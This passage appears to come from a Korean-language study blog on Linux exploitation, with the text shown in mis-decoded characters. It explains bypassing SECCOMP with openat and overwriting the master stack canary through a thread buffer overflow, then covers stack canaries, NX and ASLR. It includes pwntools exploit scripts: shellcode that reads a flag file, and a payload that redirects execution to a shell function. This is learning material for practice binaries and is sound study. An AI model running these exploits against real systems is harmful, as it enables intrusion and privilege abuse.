ìœ„í—˜ì´ ìˆë‹¤.</li><li>í”„ë¡œê·¸ë¨ì—ì„œ ì˜ë„í•˜ì§€ ì•Šì€ ì ˆëŒ€ê²½ë¡œ, ìƒëŒ€ê²½ë¡œ ìƒìœ¼ë¡œ ì ‘ê·¼ì´ ë¶ˆê°€ëŠ¥í•˜ë„ë¡ ë¡œì§ìƒ ì œì•½ì´ í•„ìš”í•˜ë‹¤.</li></ul><h3 id=bypass-seccomp>Bypass SECCOMP<a hidden class=anchor aria-hidden=true href=#bypass-seccomp>#</a></h3><ul><li><code>mmap</code> ì„ ì´ìš©í•˜ì—¬ ì…ë ¥ìœ¼ë¡œ ë°›ì€ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ë„ë¡ êµ¬í˜„ëœ ì½”ë“œì—ì„œ exploit ì„ ìœ„í•œ ì½”ë“œë¥¼ ì¹¨íˆ¬ì‹œí‚¬ ìˆ˜ ìˆìœ¼ë‚˜, SECCOMP ê¸°ë²•ìœ¼ë¡œ ì‹œìŠ¤í…œì½œì„ ì°¨ë‹¨í•¨ìœ¼ë¡œì„œ ì´ë¥¼ ë°©ì–´í•  ìˆ˜ ìˆë‹¤.<ul><li>mmap ì½”ë“œ ì˜ˆì‹œ<pre tabindex=0><code>void *shellcode = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
void (*sc)() = (void *)shellcode;
sc();
</code></pre></li></ul></li><li>SECCOMPëŠ” íŠ¹ì • ì‹œìŠ¤í…œ ì½œì„ í—ˆìš©í•˜ê±°ë‚˜ ì°¨ë‹¨í•˜ì—¬ ì˜ë„í•˜ì§€ ì•Šì€ ì‹œìŠ¤í…œ ì½œì˜ í˜¸ì¶œì„ ë§‰ëŠ” ë°©ì–´ ê¸°ë²•ì´ë‹¤. í•˜ì§€ë§Œ ì‹œìŠ¤í…œì˜ ì§€ì†ì ì¸ ê°œë°œì— ì˜í•´ ìœ ì‚¬í•œ ì—­í• ì„ í•˜ëŠ” ë‹¤ë¥¸ ì‹œìŠ¤í…œì½œë“¤ì´ ê³„ì† ìƒê²¨ë‚˜ê³  ìˆë‹¤.<ul><li>ì˜ˆë¥¼ë“¤ì–´ open ê³¼ openat ì€ ë™ì¼í•œ ì—­í• ì„ ìˆ˜í–‰í•˜ë©°, <code>open</code>ì„ ì°¨ë‹¨í•œ í”„ë¡œê·¸ë¨ì´ <code>openat</code>ì„ ì°¨ë‹¨í•˜ì§€ ì•Šì•˜ë‹¤ë©´ ì´ë¥¼ ì´ìš©í•œ í•´í‚¹ì´ ê°€ëŠ¥í•˜ë‹¤.</li><li>í•˜ì§€ë§Œ, ì‹œìŠ¤í…œ ì½œ ê°„ì—ë„ ì˜ì¡´ì„±ì´ ìˆê¸° ë•Œë¬¸ì— ì˜ì¡´ì„±ì´ ìˆëŠ” ì‹œìŠ¤í…œ ì½œì´ ì°¨ë‹¨ëœ ê²½ìš°ì—ëŠ” ìš°íšŒê°€ ë¶ˆê°€ëŠ¥ ë  ê°€ëŠ¥ì„±ì´ í¬ë‹¤.</li><li>ë°˜ëŒ€ë¡œ íŠ¹ì • ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ì— ì˜ì¡´í•˜ëŠ” í•¨ìˆ˜ë¥¼ SECCOMP ì„¤ì •ìœ¼ë¡œ í—ˆìš© í•´ ë†“ëŠ”ë‹¤ë©´, ê·¸ í•¨ìˆ˜ ë˜í•œ í—ˆìš© ë˜ì–´ ìˆìŒì„ ì•”ì‹œì ìœ¼ë¡œ ì•Œ ìˆ˜ ìˆë‹¤.<ul><li><code>execve</code> í•¨ìˆ˜ëŠ” ë‚´ë¶€ì ìœ¼ë¡œ <code>openat</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ìˆë‹¤.</li></ul></li><li><code>open</code>, <code>read</code>, <code>write</code> ëŠ” íƒ€ ì‹œìŠ¤í…œ ì½œì˜ ì˜í–¥ì„ ë°›ì§€ ì•Šê³  ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ì´ë‹¤.</li></ul></li></ul><h4 id=exploit-ì˜ˆì‹œ-1>exploit ì˜ˆì‹œ<a hidden class=anchor aria-hidden=true href=#exploit-ì˜ˆì‹œ-1>#</a></h4><ul><li><code>open</code> í•¨ìˆ˜ë¥¼ ë§‰ëŠ” í˜•íƒœì˜ ì†ŒìŠ¤ì½”ë“œê°€ ìˆì„ ë–„, <code>openat</code> ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ì„ íƒˆì·¨í•˜ëŠ” ê³µê²© ë°©ì‹ì´ë‹¤.<ul><li>ì½”ë“œ ì¼ë¶€: <code>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);</code></li><li>ë‹¨, <code>openat</code>ì€ ì²« ë²ˆì§¸ ì¸ìë¥¼ <code>AT_FDCWD</code> ë¡œ ì„¤ì •í•´ì•¼ openê³¼ ë™ì¼í•œ íš¨ê³¼ë¥¼ ë‚¸ë‹¤.<ul><li><code>openat</code> ì€ ì²« ë²ˆì¨° ì¸ìë¡œ ë°›ì€ file descriptor ì— í•´ë‹¹í•˜ëŠ” ë””ë ‰í„°ë¦¬ì—ì„œ ë¶€í„° ìƒëŒ€ ì£¼ì†Œë¥¼ ê²€ìƒ‰í•œë‹¤. ì²« ë²ˆì¨° ì¸ìë¡œ <code>AT_FDCWD</code> ë¥¼ ì…ë ¥í•˜ë©´ í˜„ì¬ ì‘ì—… ë””ë ‰í„°ë¦¬ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ìƒëŒ€ ì£¼ì†Œë¥¼ ê²€ìƒ‰í•˜ê²Œ ëœë‹¤.</li></ul></li></ul></li></ul><pre tabindex=0><code>#!/usr/bin/env python3

from pwn import *

context.arch = &#39;x86_64&#39; # ì•„í‚¤í…ì²˜ ì„¤ì •
# p = process(&#39;./bypass_seccomp&#39;)

data = shellcraft.openat(&#39;AT_FDCWD&#39;, &#34;./flag&#34;) # AT_FDCWD ì˜µì…˜ì„ ë„£ì–´ í˜„ì¬ ê²½ë¡œë¶€í„° ìƒëŒ€ ê²½ë¡œë¥¼ ê²€ìƒ‰í•˜ë„ë¡ ì„¤ì •
data += &#39;mov r10, 0xffff&#39; # r10ì€ sendfile í˜¸ì¶œì‹œ ì „ë‹¬í•  ë°ì´í„°ì˜ ì–‘ì„ ëœ»í•œë‹¤.
data += shellcraft.sendfile(1, &#39;rax&#39;, 0).replace(&#39;xor r10d, r10d&#39;,&#39;&#39;)# sendfile í˜¸ì¶œì‹œ `xor r10d, r10d` êµ¬ë¬¸ì´ ìë™ìœ¼ë¡œ ë“¤ì–´ê°€ì„œ r10ì„ ì´ˆê¸°í™”í•˜ë¯€ë¡œ ì´ë¥¼ ì œê±°í•œë‹¤.
# data += shellcraft.exit(0)

# print(data)

data = asm(data)

# print(data)

p.sendlineafter(b&#34;shellcode:&#34;, data)

p.interactive()
</code></pre><h3 id=master-canary>Master Canary<a hidden class=anchor aria-hidden=true href=#master-canary>#</a></h3><ul><li><p>ì•ì„œ SSP(Stack Smash Protector) ì˜ í•œ ì¢…ë¥˜ë¡œ <a href=./#stack-canary>stack canary</a>ë¥¼ ë°°ì› ê³ , canaryëŠ” <a href=../../linux/thread/#tls--tsd>TLS</a>(Thread Local Storage) ì˜ ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ë§Œë“¤ì–´ì§„ë‹¤.</p></li><li><p><code>TLS</code> ì˜ì—­ì€ <code>text</code>, <code>bss</code> ì˜ì—­ê³¼ ë‹¬ë¦¬ ë¡œë”ì—ì„œ ìƒì„±í•˜ëŠ” ì˜ì—­ì´ë‹¤.</p></li><li><p>ë¡œë”ì—ì„œ <code>TLS</code> ì˜ì—­ì„ ìƒì„±ì€ <code>init_tls</code> -> <code>dl_allocate_tls_storage</code> í•¨ìˆ˜ì— ì˜í•´ í• ë‹¹ë˜ê³ , <code>arch_prctl</code> ì‹œìŠ¤í…œ ì½œì—ì„œ <code>ARCH_SET_FS</code> ëª…ë ¹ì„ í˜¸ì¶œí•˜ì—¬ <code>FS segment register</code> ê°€ <code>TLS</code> ì˜ì—­ì„ ê°€ë¦¬í‚¤ë„ë¡ ì´ˆê¸°í™” í•œë‹¤.</p><ul><li><a href=../../assembly/assembly_basic/#%EC%84%B8%EA%B7%B8%EB%A8%BC%ED%8A%B8-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0>segment register</a></li></ul></li><li><p>í•œ í”„ë¡œê·¸ë¨ì˜ ëª¨ë“  <code>Stack Canary</code> ëŠ” <code>FS segment register</code> ì˜ 0x28 ë²ˆì§€ì— ìœ„ì¹˜í•˜ëŠ” ê°’ì„ ì‚¬ìš©í•˜ëŠ”ë°, FS segmentëŠ” TLS ë¡œ ì´ˆê¸°í™” ë˜ë¯€ë¡œ, FS:0x28 ì˜ ê°’ì€ TLS:0x28 ì˜ ê°’ì´ë‹¤.</p><ul><li>gdb ì—ì„œ <code>$fs_base</code> ê°’ì€ <code>FS segment register</code> ë¥¼ ì˜ë¯¸í•œë‹¤. <code>p/x $fs_base</code> ëª…ë ¹ìœ¼ë¡œ <code>FS segment register</code> ì˜ ê°’ì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.</li></ul></li><li><p>ë•Œë¬¸ì— &ldquo;TLS ì£¼ì†Œì— 0x28 ë°”ì´íŠ¸ ë§Œí¼ ë–¨ì–´ì§„ ì£¼ì†Œì— ìœ„ì¹˜í•œ ê°’&rdquo;(TLS:0x28) ì„ <code>Master Canary</code> ë¼ ë¶€ë¥¸ë‹¤.</p></li><li><p>canary ëŠ” ì‹œìŠ¤í…œì˜ pointer í¬ê¸°ì™€ ê°™ì€ í¬ê¸°ë¥¼ ê°€ì§€ë©°, ì²« byteëŠ” NULL ì´ë‹¤.</p><ul><li><code>_dl_setup_stack_chk_guard</code> í•¨ìˆ˜ì—ì„œ endian ì— ë”°ë¼ ì²« byteë¥¼ NULL ë¡œ ì„¤ì •í•œë‹¤.</li><li><code>THREAD_SET_STACK_GUARD</code> ë§¤í¬ë¡œì—ì„œ TLS + 0x28 ìœ„ì¹˜ì— canary ê°’ì„ ì‚½ì…í•œë‹¤.</li></ul></li><li><p>main thread ì™¸ ë³„ë„ë¡œ ìƒì„±í•œ thread ì—ì„œ ì„ ì–¸í•œ ë³€ìˆ˜ëŠ” TLS ì™€ ê·¼ì ‘í•œ ì˜ì—­ì— ì„ ì–¸ëœë‹¤. ë˜í•œ, ì´ ì˜ì—­ì€ <code>FS segment register</code> ë³´ë‹¤ ë‚®ì€ ì£¼ì†Œì— ìœ„ì¹˜í•˜ë¯€ë¡œ master canary ì˜ ê°’ì„ buffer overflowë¡œ ë®ì–´ ì“¸ ìˆ˜ ìˆë‹¤.</p></li></ul><h4 id=exploit-ì˜ˆì‹œ-2>exploit ì˜ˆì‹œ<a hidden class=anchor aria-hidden=true href=#exploit-ì˜ˆì‹œ-2>#</a></h4><ul><li>ì „ì œì¡°ê±´ : threadì— ì„ ì–¸í•œ ë²„í¼ì— buffer overflowë¥¼ ë°œìƒí•  ìˆ˜ ìˆë‹¤.</li><li>exploit ìˆœì„œ<ol><li>ë””ë²„ê¹…ì„ í†µí•´ matser canary ì™€ ë²„í¼ ì‚¬ì´ì˜ ê°„ê²©ì„ í™•ì¸í•œë‹¤.<ul><li>code ìƒì—ì„œ buffer ê°€ ì‚¬ìš©ë˜ëŠ” ë¶€ë¶„ì„ ì–´ì…ˆë¸”ë¦¬ì–´ì—ì„œ í™•ì¸í•œë‹¤.</li></ul><pre tabindex=0><code>   // ì›ë³¸ í•¨ìˆ˜
   void thread_routine() {
     char buf[256];
     int size = 0;
     printf(&#34;Size: &#34;);
     scanf(&#34;%d&#34;, &amp;size);
     printf(&#34;Data: &#34;);
     read_bytes(buf, size);
   }
   // disass ê²°ê³¼
   0x0000000000401347 &lt;+52&gt;:    call   0x4010f0 &lt;printf@plt&gt;
   0x000000000040134c &lt;+57&gt;:    lea    rax,[rbp-0x114]
   0x0000000000401353 &lt;+64&gt;:    mov    rsi,rax
   0x0000000000401356 &lt;+67&gt;:    lea    rdi,[rip+0xcb6]        # 0x402013
   0x000000000040135d &lt;+74&gt;:    mov    eax,0x0
   0x0000000000401362 &lt;+79&gt;:    call   0x401150 &lt;__isoc99_scanf@plt&gt;
   0x0000000000401367 &lt;+84&gt;:    lea    rdi,[rip+0xca8]        # 0x402016
   0x000000000040136e &lt;+91&gt;:    mov    eax,0x0
   0x0000000000401373 &lt;+96&gt;:    call   0x4010f0 &lt;printf@plt&gt;
   0x0000000000401378 &lt;+101&gt;:   mov    edx,DWORD PTR [rbp-0x114]
   // read_bytes ì—ì„œ ì‚¬ìš©ë  ì²« ë²ˆì§¸ ì¸ì &#39;buf&#39; ê°€ rax ì— ì ìš© ë  ê²ƒì´ë©°, ì´ëŠ” [rbp-0x110] ê°’ì´ ëŒ€ì‘ëœë‹¤.
   0x000000000040137e &lt;+107&gt;:   lea    rax,[rbp-0x110]
   0x0000000000401385 &lt;+114&gt;:   mov    esi,edx
   0x0000000000401387 &lt;+116&gt;:   mov    rdi,rax
   0x000000000040138a &lt;+119&gt;:   call   0x4012be &lt;read_bytes&gt;
</code></pre></li><li>gdb ì—ì„œ thread_routine í•¨ìˆ˜ê¹Œì§€ ì‹¤í–‰ì‹œí‚¨ ë‹¤ìŒ <code>$fs_base + 0x28</code> ìœ„ì¹˜(canaryê°€ ì €ì¥ëœ <code>FS segment register</code>)ì˜ ì£¼ë¥¼ í™•ì¸í•˜ê³ , overflow ê°€ëŠ¥í•œ ë²„í¼ì™€ ê±°ë¦¬ë¥¼ ì¸¡ì •í•œë‹¤.</li></ol><pre tabindex=0><code>pwndbg&gt; p/x ($rbp - 0x110)
$1 = 0x7ffff7da3de0
pwndbg&gt; p/x ($fs_base + 0x28)
$2 = 0x7ffff7da4728
pwndbg&gt; p/x 0x7ffff7da4728 - 0x7ffff7da3de0
$3 = 0x948
</code></pre><ol start=3><li>ë²„í¼ì—ì„œ ë¶€í„° canaryê¹Œì§€(rbp - 0x110 ~ $fs_base + 0x28 + 0x8) ì„ì˜ì˜ ê°’(&lsquo;AAAA&mldr;&rsquo;)ìœ¼ë¡œ ì±„ì›Œë„£ê²Œ ë˜ë©´ SIGSEGV ì— ì˜í•œ core dumpê°€ ë°œìƒí•  ìˆ˜ ìˆë‹¤.</li></ol><ul><li><a href=../../c++/gdb/#coredumb-%ED%8C%8C%EC%9D%BC>Coredump í™•ì¸ ë°©ë²•</a></li><li>stack ì—ì„œ ë²„í¼ ë‹¤ìŒì—ëŠ” ë‹¤ë¥¸ ì§€ì—­ë³€ìˆ˜ ê°’ì´ ìˆì„ í…ë°, ì´ë¥¼ ëª¨ë‘ &lsquo;AAAA&mldr;&rsquo; ë¡œ ì±„ìš¸ ê²½ìš° ë³€ìˆ˜ ì°¸ì¡°ì‹œ ì—ëŸ¬ê°€ ë°œìƒí•  ìˆ˜ ìˆë‹¤.</li><li>thread ìƒì„±ì‹œ í˜¸ì¶œë˜ëŠ” <code>__pthread_disable_asynccancel</code> í•¨ìˆ˜ì—ì„œ <code>struct pthread *self = THREAD_SELF;</code> ì§€ì—­ë³€ìˆ˜ë¥¼ ìƒì„±í•˜ê³ , <code>self->canceltype = PTHREAD_CANCEL_DEFERRED</code> êµ¬ë¬¸ì„ í˜¸ì¶œí•œë‹¤.</li><li><code>self->canceltype</code>ì˜ ì£¼ì†Œê°€ &lsquo;AAAA&mldr;&rsquo; ë¡œ ë®ì–´ì¨ì§€ë©´ segment fault ê°€ ë°œìƒí•œë‹¤.<ul><li>gdb ëª…ë ¹ì–´ë¡œ <code>p &((struct pthread *) $fs_base)->header.self</code> ë¥¼ ì…ë ¥í•˜ì—¬ ì´ ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li><li>THREAD_SELF ëŠ” ìŠ¤ë ˆë“œì˜ Thread Descriptorì„ ê°€ë¦¬í‚¤ëŠ” ë§¤í¬ë¡œì´ë‹¤.</li></ul></li><li>ë²„í¼ë¡œë¶€í„° <code>($fs_base)->header.self->canceltype</code> ìœ„ì¹˜ê¹Œì§€ì˜ ê±°ë¦¬ë¥¼ ê³„ì‚°í•˜ê³ , <code>self->canceltype</code> ì´ rw ê¶Œí•œì´ ìˆëŠ” ê³³ì„ ê°€ë¦¬í‚¤ë„ë¡ ë²„í¼ì— ì ë‹¹í•œ ê°’ì„ ì§‘ì–´ë„£ëŠ”ë‹¤.<ul><li>disass ê²°ê³¼ì— ì˜í•˜ë©´ <code>__pthread_disable_asynccancel</code> í•¨ìˆ˜ì˜ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œ <code>mov byte ptr [rax + 0x972], 0</code> êµ¬ë¬¸ì´ canceltype ì„ ëŒ€ì…í•˜ëŠ” ë¶€ë¶„ì´ê³ , ì´ë–„ rax ëŠ” <code>fs</code> ê°’ì´ ì±„ì›Œì ¸ ìˆë‹¤.</li><li>ì¦‰, &ldquo;ë²„í¼ì—ì„œ self ê¹Œì§€ì˜ ê±°ë¦¬&rdquo; + 0x972 ê°€ self->canceltype ì˜ ì£¼ì†Œì´ë‹¤.</li></ul></li></ul><ol start=4><li><code>vmmap</code> ëª…ë ¹ì–´ë¡œ ì‹¤í–‰íŒŒì¼ì„ ë¶„ì„í•˜ì—¬ rw ê¶Œí•œì´ ëª¨ë‘ ì¡´ì¬í•˜ëŠ” ì˜ì—­ì˜ ì£¼ì†Œë¥¼ ì°¾ëŠ”ë‹¤.</li></ol><ul><li>í”„ë¡œê·¸ë¨ ì‹¤í–‰ì— ìµœëŒ€í•œ ì˜í–¥ì„ ì£¼ì§€ ì•Šê²Œ í•˜ê¸° ìœ„í•´ ì£¼ì†Œì˜ ì¤‘ê°„ ì˜ì—­ì„ ì„ì˜ë¡œ ê³¨ë¼ self->canceltype ì˜ ì£¼ì†Œê°’ì´ rw ê¶Œí•œì„ ê°€ì§ˆ ìˆ˜ ìˆê²Œ ë²„í¼ë¥¼ ì¡°ì •í•œë‹¤.<ul><li>ex)<pre tabindex=0><code># payload ê°€ (rbp - 0x110) ~ ($fs_base + 0x28) ì˜ì—­ì„ ë®ì–´ì“°ë„ë¡ êµ¬ì„±í•œë‹¤.
payload = b&#39;A&#39;*0x910  # buffer ~ self ê¹Œì§€ ê±°ë¦¬
payload += p64(0x404800 - 0x972)  # self-&gt;canceltype ì— ë“¤ì–´ê°ˆ ì£¼ì†Œ (rwê¶Œí•œ ì¡´ì¬)
payload += b&#39;C&#39; * 0x10  # ë‚¨ëŠ”ì˜ì—­ ë§ˆì € ì±„ìš°ê¸° ()
payload += p64(0x4141414141414141)  # master canary ì˜ì—­
</code></pre></li></ul></li></ul><ol start=5><li>return ì£¼ì†Œì— exploit ì„ ìœ„í•œ í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë„ë¡ ë³€ê²½</li></ol><ul><li>ex)<pre tabindex=0><code>p = process(&#39;./mc_thread2&#39;)
elf = ELF(&#39;./mc_thread&#39;)
payload = b&#39;A&#39; * 264  # buffer ~ ì§€ì—­ë³€ìˆ˜ ì˜ì—­
payload += b&#39;A&#39; * 8 # canary
payload += b&#39;B&#39; * 8 # SFP
payload += p64(elf.symbols[&#39;giveshell&#39;])  # return address (exploit ì„ ìœ„í•œ í•¨ìˆ˜ë¡œ ë³€ê²½)
payload += b&#39;C&#39; * (0x910 - len(payload))  # master canary ì˜ì—­ì„ ë³€ì¡°ì‹œí‚¤ê¸° ìœ„í•œ dummy
payload += p64(0x404800 - 0x972)  # self-&gt;canceltype ë¥¼ ì ìš© í•  ë•Œ ë°œìƒí•˜ëŠ” SIGSEGV ë¥¼ ì—†ì• ê¸° ìœ„í•œ ì²˜ë¦¬
payload += b&#39;C&#39; * 0x10  # ë‚˜ë¨¸ì§€ ì˜ì—­ dummy ë¡œ ì±„ìš°ê¸°
payload += p64(0x4141414141414141) # master canary ë³€ì¡°
p.sendafter(b&#39;Data: &#39;, payload)
p.interactive()
</code></pre></li></ul></li></ul><h2 id=ë³´í˜¸-ê¸°ë²•>ë³´í˜¸ ê¸°ë²•<a hidden class=anchor aria-hidden=true href=#ë³´í˜¸-ê¸°ë²•>#</a></h2><ul><li>ì•ì„œ ì‚´í´ë³¸ ì·¨ì•½ì ì„ ë°©ì–´í•˜ê¸° ìœ„í•œ ê¸°ë²•ë“¤ì„ ì†Œê°œí•œë‹¤.</li></ul><h3 id=stack-canary>Stack Canary<a hidden class=anchor aria-hidden=true href=#stack-canary>#</a></h3><ul><li>ê´‘ë¶€ë“¤ì´ íƒ„ê´‘ì— ë“¤ì–´ê°ˆ ë•Œ ì¹´ë‚˜ë¦¬ì•„ ìƒˆë¥¼ ë°ë¦¬ê³  ë“¤ì–´ê°„ë‹¤. ì¹´ë‚˜ë¦¬ì•„ëŠ” ì¸ê°„ë³´ë‹¤ ê°€ìŠ¤ì— ë¯¼ê°í•˜ì—¬, ìœ ë…ê°€ìŠ¤ë¡œ ì¸í•´ ìœ„í—˜í•œ ìƒí™©ì´ ë°œìƒ í•  ê²½ìš° ì¹´ë‚˜ë¦¬ì•„ê°€ ë¨¼ì € ì´ë¥¼ ì¸ì§€í•˜ê³  ì´ìƒ í–‰ë™ì„ ë³´ì´ê²Œ ëœë‹¤. ê´‘ë¶€ë“¤ì€ ì¹´ë‚˜ë¦¬ì•„ì˜ í–‰ë™ì„ ê´€ì°°í•˜ë©° ìœ„í—˜í•œ í™˜ê²½ì—ì„œ ë¹¨ë¦¬ íƒˆì¶œí•  ìˆ˜ ìˆë‹¤.</li><li>íƒ„ê´‘ì˜ ì¹´ë‚˜ë¦¬ì•„ ìƒˆë¥¼ ë”°ì„œ Stackì˜ overflowë¥¼ ê°ì§€í•˜ëŠ” ê¸°ëŠ¥ë„ Stack Canary ë¼ ì´ë¦„ ì§“ëŠ”ë‹¤.</li><li>ìš°ë¶„íˆ¬ì—ì„œ C íŒŒì¼ì„ ì»´íŒŒì¼ í•  ë•Œ ê¸°ë³¸ì ìœ¼ë¡œ Stack Canaryë¥¼ ì ìš©í•˜ë©°, <code>-fno-stack-protector</code> ì˜µì…˜ì„ ë„£ì–´ gcc ì»´íŒŒì¼ì„ í•˜ë©´ Stack Canary ì„¤ì •ì„ ëŒ ìˆ˜ ìˆë‹¤.</li><li>Stackì´ ì˜¤ì—¼ë˜ë©´ ëŒ€ë¶€ë¶„ì€ <code>Segmentation Fault</code> ì˜¤ë¥˜ë¥¼ ë°œìƒí•˜ë©° ì¢…ë£Œëœë‹¤.</li><li>Stack Canaryê°€ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´ <code>stack smashing detected</code> ì˜¤ë¥˜ê°€ ëŒ€ì‹  ë°œìƒí•œë‹¤. ì´ëŠ” Stackì˜ ì˜¤ì—¼ì´ ê°ì§€ë˜ì–´ ê°•ì œë¡œ í”„ë¡œê·¸ë¨ì´ ì¢…ë£Œë¨ì„ ì˜ë¯¸í•œë‹¤.</li><li>Stack Canaryì˜ ë™ì‘ì„ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ í‘œí˜„í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.<pre tabindex=0><code>	mov    rax,QWORD PTR fs:0x28    # fs ë ˆì§€ìŠ¤í„°ì˜ 0x28ê°’ì„ raxì— ëŒ€ì…
  mov    QWORD PTR [rbp-0x8],rax  # ìŠ¤íƒ ì¹´ë‚˜ë¦¬ë¥¼ rbp-8ì— ì €ì¥
  call   FUNCTION                 # í•¨ìˆ˜ í˜¸ì¶œ

  ...

  mov    rcx,QWORD PTR [rbp-0x8]  # rbp-8ì—ì„œ ìŠ¤íƒ ì¹´ë‚˜ë¦¬ ì¶”ì¶œ
  xor    rcx,QWORD PTR fs:0x28    # fs:0x28ê³¼ ìŠ¤íƒ ì¹´ë‚˜ë¦¬ ë¹„êµ
  je     0x6f0 &lt;main+94&gt;          # ê°’ì´ ê°™ìœ¼ë©´ ë‹¤ë¥´ë©´ í˜¸ì¶œë¶€ë¡œ ì´ë™
  call   __stack_chk_fail@plt     # ê°’ì´ ë‹¤ë¥´ë©´ ì—ëŸ¬ ì¶œë ¥
</code></pre><ul><li>fsëŠ” ì„¸ê·¸ë¨¼íŠ¸ ë ˆì§€ìŠ¤í„°ì˜ ì¼ì¢…ìœ¼ë¡œ, ë¦¬ëˆ…ìŠ¤ëŠ” ë¶€íŒ…ì‹œ fs:0x28 ìœ„ì¹˜ì— ëœë¤ ìƒì„±í•˜ì—¬ ì €ì¥í•œë‹¤.</li></ul></li><li>X64 ì•„í‚¤í…ì²˜ëŠ” 8ë°”ì´íŠ¸, X86 ì•„í‚¤í…ì²˜ëŠ” 4ë°”ì´íŠ¸ ì¹´ë‚˜ë¦¬ë¥¼ ì‚¬ìš©í•œë‹¤.</li><li>stackì— ì ìš©ë  ë•Œ x64 ì•„í‚¤í…ì²˜ëŠ” 8ë°”ì´íŠ¸, x86 ì•„í‚¤í…ì²˜ëŠ” 4ë°”ì´íŠ¸ ë”ë¯¸ê°’ ì´í›„ canaryê°€ ë“¤ì–´ê°ì— ì£¼ì˜í•œë‹¤.<ul><li><a href=../../assembly/assembly_basic/#%EC%8A%A4%ED%83%9D%ED%94%84%EB%A0%88%EC%9E%84>stackì°¸ì¡°</a></li></ul></li><li>ì¹´ë‚˜ë¦¬ëŠ” NULL ê°’ìœ¼ë¡œ ì‹œì‘í•œë‹¤.</li><li>ì¹´ë‚˜ë¦¬ëŠ” TLSì— ì „ì—­ë³€ìˆ˜ë¡œ ì €ì¥ë˜ê³ , ê° í•¨ìˆ˜ë“¤ì´ ì´ë¥¼ ê³µìš©ìœ¼ë¡œ ì°¸ì¡°í•œë‹¤.</li></ul><h3 id=nx>NX<a hidden class=anchor aria-hidden=true href=#nx>#</a></h3><ul><li>No eXecuteì˜ ì•½ìë¡œ, ì‹¤í–‰ì— ì‚¬ìš©ë˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ê³¼ writingì— ì‚¬ìš©ë˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ì„ ë¶„ë¦¬í•˜ì—¬ ì•…ì˜ì ìœ¼ë¡œ bufferì— ì½”ë“œë¥¼ ì‹¬ì–´ ì‹¤í–‰ì‹œí‚¤ëŠ” í–‰ìœ„ë¥¼ ë°©ì§€í•˜ëŠ” ê¸°ë²•ì´ë‹¤.</li><li>NX ê¸°ë²•ì€ CPUê°€ ì§€ì›í•´ì•¼ ë™ì‘í•  ìˆ˜ ìˆë‹¤.</li><li>NXê°€ ì ìš©ëœ ë°”ì´ë„ˆë¦¬ë¥¼ gdbë¡œ ë””ë²„ê¹… í•˜ì—¬ <code>vmmap</code> ëª…ë ¹ìœ¼ë¡œ ê° ì£¼ì†Œì˜ ê¶Œí•œì„ ì‚´í´ë³´ë©´ <code>Perm</code> ì˜ì—­ì´ &lsquo;rw&rsquo;ì™€ &lsquo;x&rsquo; ê°€ ë¶„ë¦¬ëœ ê²ƒì´ í™•ì¸ëœë‹¤.</li><li>ì‹¤í–‰ ê¶Œí•œì´ ì—†ëŠ” ì£¼ì†Œë¥¼ ì‹¤í–‰ì‹œí‚¤ë ¤ í•˜ë©´ segment fault ê°€ ë°œìƒí•˜ë©° ì½”ë“œê°€ ì¢…ë£Œë˜ê²Œ ëœë‹¤.</li><li>NXê¸°ë²•ì€ XD(eXecution Disable), DEP(Data Execution Prevention), XN(eXecute Never) ë“±ìœ¼ë¡œ ë¶ˆë¦¬ê¸°ë„ í•œë‹¤.</li></ul><h3 id=aslr>ASLR<a hidden class=anchor aria-hidden=true href=#aslr>#</a></h3><ul><li>Address Space Layout Randomization ì˜ ì•½ìë¡œ ë°”ì´ë„ˆë¦¬ê°€ ì‹¤í–‰ ë  ë•Œ ë§ˆë‹¤ ë§¤ë²ˆ ë‹¤ë¥¸ ì£¼ì†Œê°’ì— ë©”ëª¨ë¦¬ ì„¸ê·¸ë¨¼íŠ¸ë“¤ì„ í• ë‹¹í•˜ì—¬ ì£¼ì†Œì˜ ìœ ì¶œì„ ë°©ì§€í•˜ëŠ” ê¸°ë²•ì´ë‹¤.</li><li>ì»¤ë„ì—ì„œ ASLRì„ ì§€ì›í•´ì•¼ ë™ì‘ì´ ê°€ëŠ¥í•˜ë‹¤.</li><li>ë¦¬ëˆ…ìŠ¤ì—ì„œ <code>cat /proc/sys/kernel/randomize_va_space</code> ëª…ë ¹ìœ¼ë¡œ í•´ë‹¹ ì»¤ë„ì´ ASLRì„ ì§€ì›í•˜ëŠ”ì§€ í™•ì¸ ê°€ëŠ¥í•˜ë‹¤.<ul><li>0 : ASLR ë¯¸ì§€ì›</li><li>1 : stack, heap, library, vdso ë“±ì˜ ì£¼ì†Œë¥¼ ëœë¤í™”</li><li>2 : (1) ì— ë”í•´ brk ì˜ì—­ë„ ëœë¤í™”</li></ul></li><li>ë¦¬ëˆ…ìŠ¤ëŠ” ASLRì´ ì ìš©ëì„ ë•Œ, í˜ì´ì§€(page) ë‹¨ìœ„ë¡œ íŒŒì¼ì„ ë§¤í•‘í•˜ê¸° ë•Œë¬¸ì— ì£¼ì†Œê°’ 64ë¹„íŠ¸ ì¤‘ ìƒìœ„ 52ë¹„íŠ¸ì˜ ì£¼ì†ŒëŠ” ë°”ë€Œì–´ë„ í•˜ìœ„ 12ë¹„íŠ¸ëŠ” ë³€ê²½ë˜ì§€ ì•ŠëŠ”ë‹¤.<ul><li>0x1111111111111222 : 1ì€ ë³€ê²½ë  ìˆ˜ ìˆê³ , 2ëŠ” ê³ ì 